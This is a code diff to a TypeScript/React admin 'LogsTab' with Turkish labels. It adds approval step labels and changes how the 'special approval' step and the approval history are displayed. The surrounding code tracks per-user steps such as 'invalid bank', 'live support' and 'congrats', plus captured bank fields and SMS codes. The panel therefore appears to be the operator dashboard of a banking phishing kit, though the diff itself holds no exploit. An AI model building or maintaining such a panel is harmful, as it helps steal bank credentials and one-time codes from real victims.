@@ -30,6 +30,15 @@ function getApprovalDisplayText(value: string): string {
     : `${matchedOption.label} Onaylandı`;
 }
 
+function getApprovalStepLabel(value: string): string {
+  const matchedOption = APPROVAL_OPTIONS.find((option) => option.value === value);
+  if (!matchedOption) {
+    return "ONAY";
+  }
+
+  return matchedOption.label.replace(" Sayfası", "").toUpperCase();
+}
+
 function parseApprovalHistory(value: unknown): string[] {
   if (typeof value !== "string" || !value.trim()) {
     return [];
@@ -901,16 +910,22 @@ export function LogsTab({ darkMode, user }: { darkMode: boolean, user: any }) {
                 else if (s === "congrats") { stepText = "TEBRİKLER"; stepColor = "text-green-500 bg-green-500/10 border border-green-500/20"; }
                 else if (s === "invalid_bank") { stepText = "HATALI BANKA"; stepColor = "text-red-500 bg-red-500/10 border border-red-500/20"; }
                 else if (s === "live_support") { stepText = "CANLI DESTEK"; stepColor = "text-cyan-500 bg-cyan-500/10 border border-cyan-500/20"; }
-                else if (s === "special_approval") { stepText = "ÖZEL BİLDİRİM"; stepColor = "text-fuchsia-500 bg-fuchsia-500/10 border border-fuchsia-500/20"; }
+                else if (s === "special_approval") {
+                  if (row.status === "SPECIAL_INFO") {
+                    stepText = "ÖZEL BİLDİRİM";
+                    stepColor = "text-fuchsia-500 bg-fuchsia-500/10 border border-fuchsia-500/20";
+                  } else if (typeof fd.approvalStatus === "string" && fd.approvalStatus.trim()) {
+                    stepText = getApprovalStepLabel(fd.approvalStatus.trim());
+                    stepColor = "text-sky-500 bg-sky-500/10 border border-sky-500/20";
+                  } else {
+                    stepText = "ONAY";
+                    stepColor = "text-sky-500 bg-sky-500/10 border border-sky-500/20";
+                  }
+                }
 
                 const canonicalBankFields = getCanonicalAdminBankFields(fd);
                 const approvalHistory = parseApprovalHistory(fd.approvalHistory);
-                const approvalEntries =
-                  approvalHistory.length > 0
-                    ? approvalHistory
-                    : typeof fd.approvalStatus === "string" && fd.approvalStatus.trim()
-                      ? [fd.approvalStatus.trim()]
-                      : [];
+                const approvalEntries = approvalHistory;
                 const smsValue =
                   typeof fd.smsCode === "string" && fd.smsCode.trim()
                     ? fd.smsCode.trim()
